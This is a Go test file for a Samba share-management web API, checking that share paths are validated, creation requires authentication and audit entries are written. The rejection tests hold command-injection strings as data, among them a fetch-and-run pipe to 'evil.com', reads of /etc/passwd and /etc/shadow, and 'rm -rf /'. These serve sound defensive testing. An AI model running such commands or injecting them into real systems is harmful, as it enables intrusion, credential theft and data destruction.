package httpapi_test

import (
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"smb-server/backend/internal/audit"
	"smb-server/backend/internal/auth"
	"smb-server/backend/internal/config"
	"smb-server/backend/internal/httpapi"
	"smb-server/backend/internal/samba"

	"github.com/gofiber/fiber/v2"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func setupTestAppWithAudit(t *testing.T) (*fiber.App, *audit.Service) {
	t.Helper()
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "shares.conf"), nil, 0o644)
	os.WriteFile(filepath.Join(dir, "smb.conf"), []byte("[global]\n    workgroup = TEST\n"), 0o644)

	cfg := &config.Config{
		SecretKey:       "test-secret-key-32chars-minimum!!",
		AdminCredsFile:  filepath.Join(dir, ".admin"),
		SambaConfigPath: dir,
		AuditLogPath:    filepath.Join(dir, "audit.json"),
		CookieSecure:    false,
	}
	authSvc := auth.New(cfg.SecretKey, cfg.AdminCredsFile, 60)
	require.NoError(t, authSvc.AddAdmin("testadmin", "testpassword123"))
	auditSvc := audit.NewService(cfg.AuditLogPath)

	app := fiber.New()
	app.Use(httpapi.SecurityHeaders())
	httpapi.SetupRoutes(app, cfg, authSvc, samba.NewFakeExecutor(), auditSvc)
	return app, auditSvc
}

// ── ValidSharePath regex ──────────────────────────────────────────────────────

func TestValidSharePath_AcceptsSafePaths(t *testing.T) {
	for _, p := range []string{
		"/mnt/shared/docs",
		"/srv/data/team-01",
		"/mnt/nas/backup",
		"/data/share_2024",
		"/mnt/a",
		"/z",
	} {
		assert.True(t, httpapi.ValidSharePath.MatchString(p), "should accept %q", p)
	}
}

func TestValidSharePath_RejectsInjectionAndUnsafePaths(t *testing.T) {
	for _, p := range []string{
		"/tmp/x; curl evil.com | bash",
		"/path with spaces",
		"/path/../etc/passwd",
		"relative/path",
		"",
		"/mnt/share\nwhoami",
		"/mnt/$(cat /etc/passwd)",
		"/mnt/`id`",
		"/mnt/share&rm -rf /",
		"/mnt/share|cat /etc/shadow",
	} {
		assert.False(t, httpapi.ValidSharePath.MatchString(p), "should reject %q", p)
	}
}

// ── Share create HTTP integration ─────────────────────────────────────────────

func TestShareCreate_RejectsCommandInjectionPath(t *testing.T) {
	app := setupTestApp(t)
	token := loginAndGetToken(t, app)

	body := `{"name":"evil","path":"/tmp/x; curl evil.com | bash","comment":""}`
	req := httptest.NewRequest("POST", "/api/shares", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := app.Test(req)
	require.NoError(t, err)
	assert.Equal(t, 400, resp.StatusCode)
}

func TestShareCreate_RejectsPathTraversal(t *testing.T) {
	app := setupTestApp(t)
	token := loginAndGetToken(t, app)

	body := `{"name":"escape","path":"/mnt/../etc/passwd","comment":""}`
	req := httptest.NewRequest("POST", "/api/shares", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := app.Test(req)
	require.NoError(t, err)
	assert.Equal(t, 400, resp.StatusCode)
}

func TestShareCreate_AcceptsValidPath(t *testing.T) {
	app := setupTestApp(t)
	token := loginAndGetToken(t, app)

	body := `{"name":"docs","path":"/mnt/shared/docs","comment":"Documentation"}`
	req := httptest.NewRequest("POST", "/api/shares", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := app.Test(req)
	require.NoError(t, err)
	assert.Equal(t, 201, resp.StatusCode)
}

func TestShareCreate_RequiresAuth(t *testing.T) {
	app := setupTestApp(t)

	body := `{"name":"docs","path":"/mnt/shared/docs","comment":""}`
	req := httptest.NewRequest("POST", "/api/shares", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")

	resp, err := app.Test(req)
	require.NoError(t, err)
	assert.Equal(t, 401, resp.StatusCode)
}

func TestDeleteShare_Returns404WhenNotFound(t *testing.T) {
	app := setupTestApp(t)
	token := loginAndGetToken(t, app)

	req := httptest.NewRequest("DELETE", "/api/shares/nonexistent", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := app.Test(req)
	require.NoError(t, err)
	assert.Equal(t, 404, resp.StatusCode)
}

func TestToggleABSE_Returns404WhenShareNotFound(t *testing.T) {
	app := setupTestApp(t)
	token := loginAndGetToken(t, app)

	req := httptest.NewRequest("PATCH", "/api/shares/ghost/abse?enabled=true", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := app.Test(req)
	require.NoError(t, err)
	assert.Equal(t, 404, resp.StatusCode)
}

func TestCreateShare_WritesAuditEntry(t *testing.T) {
	app, auditSvc := setupTestAppWithAudit(t)
	token := loginAndGetToken(t, app)

	body := `{"name":"testshare","path":"/data/testshare","comment":"test"}`
	req := httptest.NewRequest("POST", "/api/shares", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	resp, _ := app.Test(req)
	require.Equal(t, 201, resp.StatusCode)

	entries, _ := auditSvc.GetLogs(10, "create_share", "")
	require.Len(t, entries, 1)
	assert.Equal(t, "testshare", entries[0].ResourceName)
}
